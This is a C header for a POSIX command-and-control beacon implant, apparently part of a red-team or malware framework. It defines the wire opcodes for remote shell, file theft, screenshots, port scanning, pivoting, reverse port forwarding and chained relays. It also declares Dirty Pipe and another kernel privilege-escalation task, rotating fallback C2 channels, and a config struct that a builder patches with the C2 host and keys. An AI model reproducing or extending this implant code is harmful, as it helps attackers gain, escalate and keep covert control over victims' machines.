#pragma once

// POSIX beacon header — binary-compatible with Windows BeaconState layout.
// Поддерживает Linux и macOS (Apple Silicon / x86_64).
// All uint16_t[] fields store UTF-16LE (NOT wchar_t which is 4 bytes on Linux).

#include <stdint.h>
#include <stddef.h>

// ---- Platform abstractions --------------------------------------------------

#ifdef __APPLE__
  // macOS: Mach-O section (segment __DATA, section __co2cfg)
  #define CO2_CFG_SECTION __attribute__((section("__DATA,__co2cfg"), used))
  // macOS не поддерживает MSG_NOSIGNAL; используем SO_NOSIGPIPE на сокете.
  #include <sys/socket.h>
  #ifndef MSG_NOSIGNAL
    #define MSG_NOSIGNAL 0
  #endif
  // Выставить SO_NOSIGPIPE на сокете (аналог MSG_NOSIGNAL per-send на Linux).
  static inline void sock_nosigpipe(int fd) {
      int val = 1;
      setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &val, sizeof(val));
  }
#else
  // Linux: ELF section .co2cfg
  #define CO2_CFG_SECTION __attribute__((section(".co2cfg"), used))
  static inline void sock_nosigpipe(int fd) { (void)fd; }
#endif

// ---- Wire opcodes (mirror of common/co2h/proto.hpp TaskOp / RespOp) --------
#define OP_NOOP     0
#define OP_SLEEP    1
#define OP_EXIT     2
#define OP_SHELL    10
#define OP_RUN      11
#define OP_PS       12
#define OP_UPLOAD   20
#define OP_DOWNLOAD 21
#define OP_LS       22
#define OP_CD       23
#define OP_PWD      24
#define OP_RM       25
#define OP_CP       26
#define OP_MV       27
#define OP_CAT      28
#define OP_MKDIR    29
#define OP_CHMOD    30
#define OP_ENV      31
#define OP_WHOAMI   32
#define OP_ID       33
#define OP_HOSTNAME 34
#define OP_IFCONFIG 35
#define OP_KILL     36
#define OP_PRIVESC_ROOT 37  // dirty pipe (CVE-2022-0847) — payload: method string
#define OP_DIRTYFRAG    38  // xfrm/ESP + rxrpc/rxkad LPE — payload: "esp" | "rxrpc" | "" (auto)
#define OP_ISHELL       60  // {utf8 input} — start/feed/stop interactive /bin/sh; empty = stop
#define OP_TCP_PIVOT    90  // KV {host, port} — TCP pivot к teamserver pivot-listener
#define OP_SCREENSHOT   134 // {} — захват экрана → BMP через RESP_FILE
#define OP_RPORTFWD_OPEN  145 // {conn_id u64, rhost utf8, rport u32} — подключиться к rhost:rport
#define OP_RPORTFWD_DATA  146 // {conn_id u64, data bytes} — отправить данные в соединение
#define OP_RPORTFWD_CLOSE 147 // {conn_id u64} — закрыть соединение
#define OP_PORTSCAN     148 // KV {target, ports} — TCP connect scan
#define OP_RELAY_START  170 // {port u32} — открыть relay TCP listener для дочерних биконов
#define OP_RELAY_STOP   171 // {port u32} — закрыть relay listener
#define OP_RELAY_RESP   172 // {child_uid u32, data bytes} — raw frame для дочернего сокета

// Response types
#define RESP_CHECKIN 0
#define RESP_ACK     1
#define RESP_OUTPUT  2
#define RESP_FILE    3
#define RESP_ERROR   4
#define RESP_PS      5
#define RESP_LS      6

// Магический task_id для relay-кадров (сервер маршрутизирует отдельно)
#define RELAY_TASK_MAGIC    ((uint64_t)0xFFFFFFFFFFFFFFFDULL)
// Магический task_id для rportfwd out-of-band кадров
#define RPORTFWD_TASK_MAGIC ((uint64_t)0xFFFFFFFFFFFFFFFCULL)

#define OUT_CHUNK_BYTES (512u * 1024u)

// RSA public key blob max size (BCRYPT_RSAPUBLIC_BLOB format from Windows)
#define BEACON_RSA_PUB_MAX 540

// ---- Fallback C2 channels (automatic rotation on failure) -----------------
#define FALLBACK_MAX_SLOTS  4
#define FALLBACK_MAX_FAILS  3   // переключение после N подряд неудач

// Frame format
#define BEACON_FRAME_VER 0x01
#define GCM_NONCE_LEN    12
#define GCM_TAG_LEN      16

// ---- Fallback C2 channel slot (packed, patched by artifact-gen) ------------
// Каждый слот описывает альтернативный C2-канал для автоматической ротации.
// host + port + uri_checkin определяют транспорт (https://, tcp://, dns://).
#pragma pack(push, 1)
typedef struct FallbackSlot {
    uint16_t host[128];             // C2 host (UTF-16LE, 256 bytes)
    uint16_t port;                  // C2 port
    uint16_t uri_checkin[128];      // URI / transport selector (256 bytes)
    uint8_t  active;                // 1 = слот используется, 0 = пустой
    uint8_t  _pad[3];              // выравнивание до 516 байт
} FallbackSlot;                    // sizeof = 256 + 2 + 256 + 1 + 3 = 518
#pragma pack(pop)

_Static_assert(sizeof(FallbackSlot) == 518, "FallbackSlot size mismatch");

// ---- Global beacon state: packed, identical layout to Windows beacon --------
// artifact-gen patches this struct by scanning for the sentinel:
//   32 zero bytes (listener_key) + UTF-16LE "127.0.0.1\0"
#pragma pack(push, 1)
typedef struct BeaconState {
    // Static configuration (patched by artifact-gen)
    uint8_t  listener_key[32];      // OFF 0     — AES-256 key shared with listener
    uint16_t host[128];             // OFF 32    — C2 host (UTF-16LE, 256 bytes)
    uint16_t port;                  // OFF 288   — C2 port
    uint16_t uri_checkin[128];      // OFF 290   — checkin URI
    uint16_t uri_task[128];         // OFF 546   — task poll URI
    uint16_t uri_post[128];         // OFF 802   — output submit URI
    uint16_t user_agent[256];       // OFF 1058  — HTTP User-Agent (512 bytes)
    uint16_t metadata_cookie[64];   // OFF 1570  — cookie name (128 bytes)
    uint8_t  spawn_to[128];         // OFF 1698  — reserved (unused on Linux)
    uint8_t  rsa_pub_blob[BEACON_RSA_PUB_MAX]; // OFF 1826 — listener RSA pubkey (BCrypt blob)
    uint32_t rsa_pub_len;           // OFF 2366  — valid bytes in rsa_pub_blob
    char     parent_id[33];         // OFF 2370  — parent beacon hex-id

    // Runtime state
    char     beacon_id[33];         // OFF 2403  — assigned by server at checkin
    uint8_t  session_key[32];       // OFF 2436  — per-session AES key
    uint32_t sleep_ms;              // OFF 2468  — poll interval
    uint8_t  jitter_pct;            // OFF 2472  — jitter percentage
    uint8_t  authenticated;         // OFF 2473
    uint8_t  checkin_done;          // OFF 2474
    uint8_t  quit;                  // OFF 2475
    uint32_t watermark;             // OFF 2476  — reserved

    // Fallback C2 channels (после watermark — не ломает совместимость)
    FallbackSlot fallback[FALLBACK_MAX_SLOTS]; // OFF 2480 — 4 × 518 = 2072 bytes
    uint8_t  fallback_count;        // OFF 4552  — сколько слотов активно (0..4)
    uint8_t  _fb_pad[3];           // OFF 4553  — выравнивание
} BeaconState;
#pragma pack(pop)

_Static_assert(sizeof(BeaconState) == 4556, "BeaconState layout mismatch");

BeaconState* beacon_state(void);

// ---- Task / Output structs -------------------------------------------------
typedef struct BeaconTask {
    uint64_t id;
    uint16_t op;
    uint32_t pay_len;
    uint8_t* pay;
} BeaconTask;

// ---- Allocator -------------------------------------------------------------
void* bmalloc(size_t n);
void* bcalloc(size_t n);
void  bfree(void* p);
void* brealloc(void* p, size_t n);

// ---- UTF-16LE helpers (read patched struct fields) -------------------------
// Convert UTF-16LE (uint16_t[]) to UTF-8. Returns bytes written (excl. NUL).
size_t utf16le_to_utf8(const uint16_t* src, size_t max_chars,
                       char* dst, size_t dst_cap);

// ---- Crypto (OpenSSL) -----------------------------------------------------
size_t aes_gcm_seal(const uint8_t* key32, const uint8_t* nonce12,
                    const uint8_t* pt, size_t pt_len,
                    uint8_t* out);

size_t aes_gcm_open(const uint8_t* key32, const uint8_t* nonce12,
                    const uint8_t* ct_tag, size_t ct_tag_len,
                    uint8_t* out_pt);

void   bc_random(uint8_t* out, size_t n);

// RSA-OAEP-SHA256 encrypt. pub_blob is Windows BCRYPT_RSAPUBLIC_BLOB format.
size_t rsa_oaep_encrypt(const uint8_t* pub_blob, uint32_t pub_blob_len,
                        const uint8_t* pt, uint32_t pt_len,
                        uint8_t* out, uint32_t out_cap);

// Frame sealing: [1-byte ver][12 nonce][ciphertext][16 tag]
size_t seal_frame(const uint8_t* key32, const uint8_t* pt, size_t pt_len,
                  uint8_t* out);
size_t open_frame(const uint8_t* key32, const uint8_t* blob, size_t blob_len,
                  uint8_t* out);

// ---- Transport abstraction -------------------------------------------------
typedef struct TransportVtbl {
    int (*checkin)(const uint8_t* metadata, size_t metadata_len,
                   uint8_t* out_frame, size_t* out_frame_len);
    int (*poll_tasks)(uint8_t* out_frame, size_t* out_frame_len);
    int (*submit_output)(const uint8_t* frame, size_t frame_len);
    int (*connection_lost)(void);
} TransportVtbl;

extern const TransportVtbl g_transport_https;
extern const TransportVtbl g_transport_tcp;
extern const TransportVtbl g_transport_dns;

// Transport selector (checks uri_checkin prefix: "tcp://", "dns://", default HTTPS)
const TransportVtbl* select_transport(void);

// ---- Output queue ----------------------------------------------------------
void   out_begin(uint64_t task_id, uint16_t resp);
void   out_write(const void* data, size_t len);
void   out_mark_done(void);
size_t out_remaining(void);
void   out_flush_chunk(const TransportVtbl* t, uint32_t is_last);
void   out_flush_via_transport(const TransportVtbl* t);
const  TransportVtbl* get_transport(void);

// ---- Прямая отправка кадра минуя общий выходной буфер ---------------------
void transport_direct_send(const TransportVtbl* t, uint64_t task_id,
                           const uint8_t* data, size_t len);
void transport_direct_send_typed(const TransportVtbl* t, uint64_t task_id,
                                 uint32_t resp_type,
                                 const uint8_t* data, size_t len);

// ---- Relay (chain pivot) --------------------------------------------------
void relay_flush_pending(const TransportVtbl* t);

// ---- Reverse Port Forward ------------------------------------------------
void rportfwd_flush_pending(const TransportVtbl* t);

// ---- KV encoder / decoder --------------------------------------------------
void   kv_reset(uint8_t* buf, size_t cap);
void   kv_put_str(const char* key, const char* val);
void   kv_put_bytes(const char* key, const uint8_t* val, uint32_t len);
void   kv_put_u32(const char* key, uint32_t v);
void   kv_put_u64(const char* key, uint64_t v);
size_t kv_finish(uint8_t* out_count_prefix);

int    kv_find(const uint8_t* buf, size_t len, const char* key,
               const uint8_t** out_val, uint32_t* out_len);
int    kv_get_str(const uint8_t* buf, size_t len, const char* key,
                  char* out, size_t out_cap);
int    kv_get_u32(const uint8_t* buf, size_t len, const char* key, uint32_t* out);
int    kv_get_u64(const uint8_t* buf, size_t len, const char* key, uint64_t* out);

// ---- Metadata --------------------------------------------------------------
size_t build_metadata(uint8_t* out, size_t cap,
                      const uint8_t* wrapped_key, uint32_t wrapped_key_len);

// ---- Command dispatch ------------------------------------------------------
void cmd_dispatch(const BeaconTask* t);

// ---- Interactive shell pump (called from main loop each iteration) ---------
// Flushes pending output from long-running shell commands (linpeas, etc.)
void ishell_pump(void);

// ---- Debug logging ---------------------------------------------------------
#ifdef CO2H_DEBUG
#include <stdio.h>
static inline void bdbg(const char* msg) { fputs(msg, stderr); }
#else
static inline void bdbg(const char* msg) { (void)msg; }
#endif
